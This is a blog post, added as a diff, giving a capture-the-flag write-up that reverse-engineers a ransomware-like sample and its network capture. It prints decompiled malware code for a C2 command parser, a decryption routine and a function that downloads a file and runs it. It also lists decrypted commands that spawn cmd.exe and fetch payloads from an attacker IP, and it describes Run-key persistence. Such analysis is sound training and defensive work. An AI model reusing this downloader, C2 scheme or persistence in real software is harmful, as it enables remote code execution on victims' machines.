@@ -1,0 +1,614 @@
+---
+title: '[WRITE UP] - Capture Point 5353 3.0'
+description: ''
+date: '2025-03-13'
+tags: ['2025', 'Reverse']
+authors: ['tdeit']
+draft: false
+---
+# Ransomware Unchained
+
+## Overview
+
+This challenge had some issues, so it took me longer than expected. It doesn't quite feel like a typical Ransomware
+
+## Challenge Information
+
+> *Ransomware Unchained*
+> 
+> 
+> *A mysterious ransomware is on the loose! It locks files, executes secret commands, and whispers to a hidden C2 server. Can you analyze the artifacts, uncover the decryption key, and rescue the flag before it’s too late?*
+> 
+
+> Given file:
+> 
+
+After extracted, I given two files: `capture.pcapng` and `sample.exe`
+
+![alt text](/blog/img/capture-point/image.png)
+
+I used `die` to detect some information, so it is written by C++ and is PE64-bit. So I will use IDA Pro for my static analysis.
+
+![alt text](/blog/img/capture-point/image-1.png)
+
+## My analyze
+
+### Resolve IP address at runtime
+
+First, after opening IDA Pro and jumping to the Entry Point, I saw this code. It's loading from its own resources and decrypting that string. After setting a breakpoint right at the decryption function, I obtained the IP address of attacker.
+
+![alt text](/blog/img/capture-point/image-2.png)
+
+![alt text](/blog/img/capture-point/image-3.png)
+
+### Persistence
+
+After resolving the IP address, this program configures itself to run automatically upon system startup by adding an entry to the `Software\Microsoft\Windows\CurrentVersion\Run` registry key for persistence.
+
+![alt text](/blog/img/capture-point/image-4.png)
+
+### Using Winsocket for request and response
+
+This program uses WinSocket to open a connection using the resolved IP address and then continues the program's flow by calling the function `sub_7FF664D220C0`
+
+![alt text](/blog/img/capture-point/image-5.png)
+
+### Processing receive data
+
+After receiving data from the server, this function will process that data and then compare it against different cases to continue its malicious behavior.
+
+The code below handles an input string that is Base64 encoded. If the string starts with the character 'D', the remaining part is split using '|' as a delimiter, and the first part is stored in `v10`, while the second part is stored in `v11`.
+
+However, if the string starts with 'E', it will be processed by the function `sub_7FF664D219F0` 
+
+Finally, the part before the '|' delimiter is used to calculate a hash value. This hash is then used for comparisons with different cases later in the program and for subsequent processing (I will show this later)
+
+```c
+  v1 = -1LL;
+  v3 = -1LL;
+  do
+    v4 = pszString[++v3] == 0;
+  while ( !v4 );
+  if ( pszString[v3 - 1] == 10 )
+  {
+    v5 = -1LL;
+    do
+      v4 = pszString[++v5] == 0;
+    while ( !v4 );
+    pszString[v5 - 1] = 0;
+  }
+  v6 = -1LL;
+  pcbBinary = 0;
+  do
+    ++v6;
+  while ( pszString[v6] );
+  CryptStringToBinaryA(pszString, v6, 1u, 0LL, &pcbBinary, 0LL, 0LL);
+  v7 = pcbBinary + 1;
+  if ( pcbBinary == -1 )
+    v7 = -1LL;
+  v8 = (char *)malloc(v7);
+  memset(v8, 0, pcbBinary + 1);
+  v9 = -1LL;
+  do
+    ++v9;
+  while ( pszString[v9] );
+  CryptStringToBinaryA(pszString, v9, 1u, (BYTE *)v8, &pcbBinary, 0LL, 0LL);
+  Context = 0LL;
+  v10 = 0LL;
+  Delimiter[0] = 124;
+  v11 = 0LL;
+  if ( *v8 == 68 )
+  {
+    v10 = strtok_s(v8 + 1, Delimiter, &Context);
+    if ( v10 )
+      v11 = strtok_s(0LL, Delimiter, &Context);
+  }
+  if ( *v8 == 69 )
+  {
+    v12 = (char *)sub_7FF664D219F0(v8 + 1, pcbBinary - 1);
+    v10 = strtok_s(v12, Delimiter, &Context);
+    if ( v10 )
+      v11 = strtok_s(0LL, Delimiter, &Context);
+  }
+  v13 = 0;
+  v14 = -1LL;
+  do
+    ++v14;
+  while ( v10[v14] );
+  if ( (int)v14 <= 0 )
+    goto LABEL_82;
+  v15 = (unsigned int)v14;
+  do
+  {
+    v16 = *v10++;
+    v13 = v16 + __ROR4__(v13, 13);
+    --v15;
+  }
+```
+
+### Case 1:
+
+In this case, `v11` (which is the part after the '|') will be assigned to a local variable. This variable will then be used by the function `sub_7FF664D219F0` (the function that gets called for processing if the input string starts with 'E')
+
+![alt text](/blog/img/capture-point/image-6.png)
+
+![alt text](/blog/img/capture-point/image-7.png)
+
+So from this, I will check the file `pcapng` , to see this strings
+
+![alt text](/blog/img/capture-point/image-8.png)
+
+With the first line strings, I decrypted using Base64 and obtained the string
+
+![alt text](/blog/img/capture-point/image-9.png)
+
+`DKEYEXCH|ENCRYPTTRAFFIK07` 
+
+Therefore, 'ENCRYPTTRAFFIK07' will likely be the string used by `sub_7FF664D219F0` 
+
+### Processing sending command
+
+After decrypting the Base64 commands sent by the server once, it can be seen that they all start with the letter 'E'. Therefore, we will analyze the function that processes this data
+
+```c
+void *__fastcall sub_7FF664D219F0(__int64 a1, unsigned int a2)
+{
+  int v4; // ecx
+  int v5; // eax
+  int v6; // ecx
+  int v7; // eax
+  void *v8; // r15
+  unsigned __int8 *v9; // rcx
+  __int64 v10; // rsi
+  _DWORD *v11; // rdi
+  unsigned int v12; // ebx
+  unsigned __int64 v13; // r9
+  __int64 v14; // r14
+  unsigned int v15; // r10d
+  unsigned int v16; // r11d
+  unsigned int v17; // eax
+  unsigned int v18; // ebx
+  unsigned int v19; // r11d
+  unsigned int v20; // r10d
+  int v21; // edx
+  unsigned int v22; // r11d
+  unsigned int v23; // r10d
+  int v24; // edx
+  unsigned int v25; // r11d
+  unsigned int v26; // r10d
+  unsigned int v27; // eax
+  unsigned int v28; // r11d
+  unsigned int v29; // r10d
+  int v30; // edx
+  unsigned int v31; // r11d
+  unsigned int v32; // r10d
+  int v33; // edx
+  unsigned int v34; // r11d
+  unsigned int v35; // r10d
+  unsigned int v36; // eax
+  unsigned int v37; // r11d
+  unsigned int v38; // r10d
+  int v39; // edx
+  unsigned int v40; // r11d
+  unsigned int v41; // r10d
+  int v42; // edx
+  unsigned int v43; // r11d
+  unsigned int v44; // r10d
+  unsigned int v45; // eax
+  unsigned int v46; // r11d
+  unsigned int v47; // r10d
+  int v48; // edx
+  unsigned int v49; // r11d
+  unsigned int v50; // r10d
+  int v51; // edx
+  unsigned int v52; // r11d
+  unsigned int v53; // r10d
+  unsigned int v54; // r11d
+  unsigned int v55; // r10d
+  int v56; // edx
+  unsigned int v57; // r11d
+  unsigned int v58; // r10d
+  int v59; // edx
+  unsigned int v60; // r11d
+  unsigned int v61; // r10d
+  _DWORD v63[4]; // [rsp+20h] [rbp-10h]
+
+  v4 = *(char *)(qword_7FF664D286F0 + 5) | (*(char *)(qword_7FF664D286F0 + 4) << 8);
+  v63[0] = *(char *)(qword_7FF664D286F0 + 3) | ((*(char *)(qword_7FF664D286F0 + 2) | ((*(char *)(qword_7FF664D286F0 + 1) | (*(char *)qword_7FF664D286F0 << 8)) << 8)) << 8);
+  v5 = *(char *)(qword_7FF664D286F0 + 9);
+  v63[1] = *(char *)(qword_7FF664D286F0 + 7) | ((*(char *)(qword_7FF664D286F0 + 6) | (v4 << 8)) << 8);
+  v6 = *(char *)(qword_7FF664D286F0 + 11) | ((*(char *)(qword_7FF664D286F0 + 10) | ((v5 | (*(char *)(qword_7FF664D286F0 + 8) << 8)) << 8)) << 8);
+  v7 = *(char *)(qword_7FF664D286F0 + 13);
+  v63[2] = v6;
+  v63[3] = *(char *)(qword_7FF664D286F0 + 15) | ((*(char *)(qword_7FF664D286F0 + 14) | ((v7 | (*(char *)(qword_7FF664D286F0 + 12) << 8)) << 8)) << 8);
+  v8 = malloc(a2);
+  memset(v8, 0, a2);
+  if ( a2 )
+  {
+    v9 = (unsigned __int8 *)(a1 + 2);
+    v10 = ((a2 - 1) >> 3) + 1;
+    v11 = v8;
+    do
+    {
+      v12 = -957401312;
+      v13 = 3337565984LL;
+      v14 = 2LL;
+      v15 = v9[1] | ((*v9 | ((*(v9 - 1) | (*(v9 - 2) << 8)) << 8)) << 8);
+      v16 = v9[5] | ((v9[4] | ((v9[3] | (v9[2] << 8)) << 8)) << 8);
+      do
+      {
+        v17 = v12 + v63[(v13 >> 11) & 3];
+        v18 = v12 + 1640531527;
+        v19 = v16 - (v17 ^ (v15 + ((16 * v15) ^ (v15 >> 5))));
+        v20 = v15 - ((v18 + v63[v18 & 3]) ^ (v19 + ((16 * v19) ^ (v19 >> 5))));
+        v21 = (v18 + v63[(v18 >> 11) & 3]) ^ (v20 + ((16 * v20) ^ (v20 >> 5)));
+        v18 += 1640531527;
+        v22 = v19 - v21;
+        v23 = v20 - ((v18 + v63[v18 & 3]) ^ (v22 + ((16 * v22) ^ (v22 >> 5))));
+        v24 = (v18 + v63[(v18 >> 11) & 3]) ^ (v23 + ((16 * v23) ^ (v23 >> 5)));
+        v18 += 1640531527;
+        v25 = v22 - v24;
+        v26 = v23 - ((v18 + v63[v18 & 3]) ^ (v25 + ((16 * v25) ^ (v25 >> 5))));
+        v27 = v18 + v63[(v18 >> 11) & 3];
+        v18 += 1640531527;
+        v28 = v25 - (v27 ^ (v26 + ((16 * v26) ^ (v26 >> 5))));
+        v29 = v26 - ((v18 + v63[v18 & 3]) ^ (v28 + ((16 * v28) ^ (v28 >> 5))));
+        v30 = (v18 + v63[(v18 >> 11) & 3]) ^ (v29 + ((16 * v29) ^ (v29 >> 5)));
+        v18 += 1640531527;
+        v31 = v28 - v30;
+        v32 = v29 - ((v18 + v63[v18 & 3]) ^ (v31 + ((16 * v31) ^ (v31 >> 5))));
+        v33 = (v18 + v63[(v18 >> 11) & 3]) ^ (v32 + ((16 * v32) ^ (v32 >> 5)));
+        v18 += 1640531527;
+        v34 = v31 - v33;
+        v35 = v32 - ((v18 + v63[v18 & 3]) ^ (v34 + ((16 * v34) ^ (v34 >> 5))));
+        v36 = v18 + v63[(v18 >> 11) & 3];
+        v18 += 1640531527;
+        v37 = v34 - (v36 ^ (v35 + ((16 * v35) ^ (v35 >> 5))));
+        v38 = v35 - ((v18 + v63[v18 & 3]) ^ (v37 + ((16 * v37) ^ (v37 >> 5))));
+        v39 = (v18 + v63[(v18 >> 11) & 3]) ^ (v38 + ((16 * v38) ^ (v38 >> 5)));
+        v18 += 1640531527;
+        v40 = v37 - v39;
+        v41 = v38 - ((v18 + v63[v18 & 3]) ^ (v40 + ((16 * v40) ^ (v40 >> 5))));
+        v42 = (v18 + v63[(v18 >> 11) & 3]) ^ (v41 + ((16 * v41) ^ (v41 >> 5)));
+        v18 += 1640531527;
+        v43 = v40 - v42;
+        v44 = v41 - ((v18 + v63[v18 & 3]) ^ (v43 + ((16 * v43) ^ (v43 >> 5))));
+        v45 = v18 + v63[(v18 >> 11) & 3];
+        v18 += 1640531527;
+        v46 = v43 - (v45 ^ (v44 + ((16 * v44) ^ (v44 >> 5))));
+        v47 = v44 - ((v18 + v63[v18 & 3]) ^ (v46 + ((16 * v46) ^ (v46 >> 5))));
+        v48 = (v18 + v63[(v18 >> 11) & 3]) ^ (v47 + ((16 * v47) ^ (v47 >> 5)));
+        v18 += 1640531527;
+        v49 = v46 - v48;
+        v50 = v47 - ((v18 + v63[v18 & 3]) ^ (v49 + ((16 * v49) ^ (v49 >> 5))));
+        v51 = (v18 + v63[(v18 >> 11) & 3]) ^ (v50 + ((16 * v50) ^ (v50 >> 5)));
+        v18 += 1640531527;
+        v52 = v49 - v51;
+        v53 = v50 - ((v18 + v63[v18 & 3]) ^ (v52 + ((16 * v52) ^ (v52 >> 5))));
+        v54 = v52 - ((v18 + v63[(v18 >> 11) & 3]) ^ (v53 + ((16 * v53) ^ (v53 >> 5))));
+        v18 += 1640531527;
+        v55 = v53 - ((v18 + v63[v18 & 3]) ^ (v54 + ((16 * v54) ^ (v54 >> 5))));
+        v56 = (v18 + v63[(v18 >> 11) & 3]) ^ (v55 + ((16 * v55) ^ (v55 >> 5)));
+        v18 += 1640531527;
+        v57 = v54 - v56;
+        v58 = v55 - ((v18 + v63[v18 & 3]) ^ (v57 + ((16 * v57) ^ (v57 >> 5))));
+        v59 = (v18 + v63[(v18 >> 11) & 3]) ^ (v58 + ((16 * v58) ^ (v58 >> 5)));
+        v18 += 1640531527;
+        v60 = v57 - v59;
+        v61 = v58 - ((v18 + v63[v18 & 3]) ^ (v60 + ((16 * v60) ^ (v60 >> 5))));
+        v16 = v60 - ((v18 + v63[(v18 >> 11) & 3]) ^ (v61 + ((16 * v61) ^ (v61 >> 5))));
+        v12 = v18 + 1640531527;
+        v13 = v12;
+        v15 = v61 - ((v12 + v63[v12 & 3]) ^ (v16 + ((16 * v16) ^ (v16 >> 5))));
+        --v14;
+      }
+      while ( v14 );
+      *v11 = _byteswap_ulong(v15);
+      v9 += 8;
+      v11[1] = _byteswap_ulong(v16);
+      v11 += 2;
+      --v10;
+    }
+    while ( v10 );
+  }
+  return v8;
+}
+```
+
+From the code above, I can just using AppCall to call this function and create decrypt these encrypted strings
+
+```c
+RS1J1SxUJcq0y6CmpvlFHTUxUub0NrsRb96TEwoWI5GFR0RM/jkk9ZA=
+RXUBvuF7XzYu3La0O/fiqLx3nHSXTn7Ghw==
+RT6v61YF2uq+B5OOcTNe7h8=RT6v61YF2uq+B5OOcTNe7h8=
+RSPPpIhlKGAsCmnkR3kD+uD5g30DH199VGWitl4BFgiF7LhZMn4GWFBrg40R9ty2p1pAStWd399I
+RSPPpIhlKGAsCmnkR3kD+uD5g30DH199VGWitl4BFgiF7LhZMn4GWFDRIh1agXJSpaR7Fxcm+fFl
+```
+
+Here they are:
+
+```c
+CMDSHEL|C:\windows\system32\cmd.exe
+EXECCMD|cd %temp%
+EXITSHEL
+DOWNEXEC|http://192.168.138.67:8080/data.png|DEKRYPT|0
+DOWNEXEC|http://192.168.138.67:8080/data.txt|DEKRYPT|1
+```
+
+From these commands, we now have a full picture of what has happened
+
+I have created a code to generate the hash and will continue analyzing to see what it does next
+
+```python
+def ror32(value, count):
+    return ((value >> count) | (value << (32 - count))) & 0xFFFFFFFF
+
+def hash_v10(s):
+    v13 = 0
+    for c in s:
+        v13 = (ord(c) + ror32(v13, 13)) & 0xFFFFFFFF
+    return v13
+
+v10 = "DOWNEXEC"
+v13 = hash_v10(v10)
+print(f"v13 = {v13} (hex: {hex(v13)})")
+```
+
+![alt text](/blog/img/capture-point/image-10.png)
+
+- Code of sub_7FF664D22890
+    
+    ```python
+    int __fastcall sub_7FF664D22890(LPCWSTR lpszUrl, _WORD *Src, int a3)
+    {
+      __int64 v6; // rdi
+      __int64 v7; // rax
+      bool v8; // zf
+      void *v9; // rax
+      void *v10; // rbx
+      void *v11; // rax
+      void *v12; // r15
+      void *v13; // rax
+      void *v14; // r13
+      HANDLE FileW; // r14
+      DWORD v16; // ebx
+      HANDLE v17; // rax
+      void *v18; // r14
+      DWORD FileSize; // r15d
+      void *v20; // r12
+      void *v21; // r14
+      HANDLE v22; // rax
+      void *v23; // rbx
+      __int64 v24; // rax
+      __int64 v25; // rcx
+      size_t v26; // rbx
+      char *v27; // r14
+      __int64 v28; // r8
+      __int64 v29; // rax
+      __int64 v30; // r8
+      size_t v31; // r8
+      void *v33; // [rsp+50h] [rbp-B0h]
+      void *v34; // [rsp+58h] [rbp-A8h]
+      DWORD pcbBinary[3]; // [rsp+64h] [rbp-9Ch] BYREF
+      $2B4FDC4BF487E67F052937EE78FAE255 UrlComponents; // [rsp+70h] [rbp-90h] BYREF
+      struct _PROCESS_INFORMATION ProcessInformation; // [rsp+E0h] [rbp-20h] BYREF
+      DWORD dwNumberOfBytesRead; // [rsp+F8h] [rbp-8h] BYREF
+      DWORD NumberOfBytesRead; // [rsp+FCh] [rbp-4h] BYREF
+      DWORD v41; // [rsp+100h] [rbp+0h] BYREF
+      DWORD NumberOfBytesWritten; // [rsp+104h] [rbp+4h] BYREF
+      struct _STARTUPINFOW StartupInfo; // [rsp+110h] [rbp+10h] BYREF
+      WCHAR TempFileName[264]; // [rsp+180h] [rbp+80h] BYREF
+      WCHAR Buffer[264]; // [rsp+390h] [rbp+290h] BYREF
+      _BYTE v46[256]; // [rsp+5A0h] [rbp+4A0h] BYREF
+      _BYTE v47[1024]; // [rsp+6A0h] [rbp+5A0h] BYREF
+      _BYTE v48[1024]; // [rsp+AA0h] [rbp+9A0h] BYREF
+    
+      memset(v46, 0, sizeof(v46));
+      memset(v48, 0, sizeof(v48));
+      v6 = -1LL;
+      UrlComponents.lpszHostName = (LPWSTR)v46;
+      UrlComponents.lpszUrlPath = (LPWSTR)v48;
+      v7 = -1LL;
+      memset(&UrlComponents, 0, 24);
+      UrlComponents.dwStructSize = 104;
+      memset(&UrlComponents.dwHostNameLength, 0, 40);
+      UrlComponents.dwHostNameLength = 128;
+      memset(&UrlComponents.dwUrlPathLength, 0, 24);
+      UrlComponents.dwUrlPathLength = 512;
+      do
+        v8 = lpszUrl[++v7] == 0;
+      while ( !v8 );
+      LODWORD(v9) = InternetCrackUrlW(lpszUrl, 2 * v7, 0, &UrlComponents);
+      if ( (_DWORD)v9 )
+      {
+        v9 = InternetOpenW(L"ChernyyKhod", 1u, 0LL, 0LL, 0);
+        v33 = v9;
+        v10 = v9;
+        if ( v9 )
+        {
+          v11 = InternetConnectW(v9, UrlComponents.lpszHostName, UrlComponents.nPort, 0LL, 0LL, 3u, 0, 0LL);
+          v34 = v11;
+          v12 = v11;
+          if ( v11 )
+          {
+            v13 = HttpOpenRequestW(v11, L"GET", UrlComponents.lpszUrlPath, 0LL, 0LL, 0LL, 0x4000000u, 0LL);
+            v14 = v13;
+            if ( v13 )
+            {
+              if ( HttpSendRequestW(v13, 0LL, 0, 0LL, 0) )
+              {
+                memset(v47, 0, sizeof(v47));
+                dwNumberOfBytesRead = 0;
+                NumberOfBytesWritten = 0;
+                GetTempPathW(0x104u, Buffer);
+                if ( a3 )
+                {
+                  GetTempFileNameW(Buffer, L"kri", 0, TempFileName);
+                }
+                else
+                {
+                  lstrcatW(Buffer, ++UrlComponents.lpszUrlPath);
+                  lstrcpyW(TempFileName, Buffer);
+                }
+                FileW = CreateFileW(TempFileName, 4u, 2u, 0LL, 2u, 0x80u, 0LL);
+                do
+                {
+                  if ( InternetReadFile(v14, v47, 0x400u, &dwNumberOfBytesRead) )
+                    WriteFile(FileW, v47, dwNumberOfBytesRead, &NumberOfBytesWritten, 0LL);
+                  v16 = dwNumberOfBytesRead;
+                  memset(v47, 0, dwNumberOfBytesRead);
+                }
+                while ( v16 );
+                CloseHandle(FileW);
+                v17 = CreateFileW(TempFileName, 0x80000000, 1u, 0LL, 3u, 0x80u, 0LL);
+                v18 = v17;
+                if ( v17 != (HANDLE)-1LL )
+                {
+                  FileSize = GetFileSize(v17, 0LL);
+                  v20 = malloc(FileSize);
+                  memset(v20, 0, FileSize);
+                  NumberOfBytesRead = 0;
+                  if ( ReadFile(v18, v20, FileSize, &NumberOfBytesRead, 0LL) )
+                  {
+                    CloseHandle(v18);
+                    if ( NumberOfBytesRead == FileSize )
+                    {
+                      pcbBinary[0] = 0;
+                      if ( CryptStringToBinaryA((LPCSTR)v20, FileSize, 1u, 0LL, pcbBinary, 0LL, 0LL) )
+                      {
+                        v21 = malloc(pcbBinary[0]);
+                        memset(v21, 0, pcbBinary[0]);
+                        if ( CryptStringToBinaryA((LPCSTR)v20, FileSize, 1u, (BYTE *)v21, pcbBinary, 0LL, 0LL) )
+                        {
+                          v22 = CreateFileW(TempFileName, 0x40000000u, 2u, 0LL, 2u, 0x80u, 0LL);
+                          v23 = v22;
+                          if ( v22 != (HANDLE)-1LL )
+                          {
+                            v41 = 0;
+                            if ( WriteFile(v22, v21, pcbBinary[0], &v41, 0LL) )
+                            {
+                              CloseHandle(v23);
+                              if ( v41 == pcbBinary[0] )
+                              {
+                                if ( a3 )
+                                {
+                                  StartupInfo.cb = 104;
+                                  v24 = -1LL;
+                                  memset(&StartupInfo.cb + 1, 0, 100);
+                                  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
+                                  do
+                                    ++v24;
+                                  while ( Src[v24] );
+                                  v25 = -1LL;
+                                  do
+                                    ++v25;
+                                  while ( TempFileName[v25] );
+                                  v26 = (unsigned int)(2 * (v25 + v24) + 4);
+                                  v27 = (char *)malloc(v26);
+                                  memset(v27, 0, (unsigned int)v26);
+                                  v28 = -1LL;
+                                  do
+                                    ++v28;
+                                  while ( TempFileName[v28] );
+                                  memcpy(v27, TempFileName, 2 * v28);
+                                  v29 = -1LL;
+                                  do
+                                    v8 = TempFileName[++v29] == 0;
+                                  while ( !v8 );
+                                  v30 = -1LL;
+                                  *(_WORD *)&v27[2 * v29] = 32;
+                                  do
+                                    ++v30;
+                                  while ( Src[v30] );
+                                  v31 = 2 * v30;
+                                  do
+                                    v8 = TempFileName[++v6] == 0;
+                                  while ( !v8 );
+                                  memcpy(&v27[2 * v6 + 2], Src, v31);
+                                  CreateProcessW(
+                                    0LL,
+                                    (LPWSTR)v27,
+                                    0LL,
+                                    0LL,
+                                    0,
+                                    0,
+                                    0LL,
+                                    Buffer,
+                                    &StartupInfo,
+                                    &ProcessInformation);
+                                }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                  v12 = v34;
+                }
+                v10 = v33;
+              }
+              InternetCloseHandle(v14);
+            }
+            InternetCloseHandle(v12);
+          }
+          LODWORD(v9) = InternetCloseHandle(v10);
+        }
+      }
+      return (int)v9;
+    }
+    ```
+    
+
+Okay, so the string 'http://192.168.138.67:8080/data.png|DEKRYPT|0' is analyzed by the program into three parts: a path to download a file, a parameter string (here it's 'DEKRYPT'), and a control flag. After downloading the content from the URL, the program will decode the Base64 and write it to a temp file
+
+0: flag a3 == 0, used to decide whether to execute the file after downloading or not.
+
+0 → only download and write to disk
+1 → download, write, then run the file with DEKRYPT as a parameter
+
+So next, I will extract 2 that file and analyze
+
+### Extract and analyze download data
+
+I looked in the `pcapng` file and extracted two files that the program downloads from the server
+
+data.txt after decrypted base64
+
+![alt text](/blog/img/capture-point/image-11.png)
+
+data.png after decrypted base64
+
+![alt text](/blog/img/capture-point/image-12.png)
+
+So, it can be understood that the program will receive an encrypted image and then use the other exe file (`data.txt`) to decrypt it (this is the part that doesn't quite seem right for a ransomware; why would the attacker send the encrypted image to the victim and then send a way to decrypt that image?)
+
+### Analyzing data.txt (file exe for decrypt)
+
+Firstly, this program is written by C++ and PE64-bit, so I will use IDA for my static
+
+![alt text](/blog/img/capture-point/image-13.png)
+
+The main function will receive one input argument `argv[1]` and then call another function to continue the process
+
+![alt text](/blog/img/capture-point/image-14.png)
+
+After go around these function, I can understand that, this program will received `DEKRYPT` for the decryption.
+
+![alt text](/blog/img/capture-point/image-15.png)
+
+### Decrypt and FLAG
+
+So we can just run this program to decrypt this
+
+Remember decrypt base64 `data.png` 
+
+I breakpoint at this (after the program decrypt it)
+
+![alt text](/blog/img/capture-point/image-16.png)
+
+![alt text](/blog/img/capture-point/image-17.png)
+
+So this is the flag
+
+![alt text](/blog/img/capture-point/image-18.png)
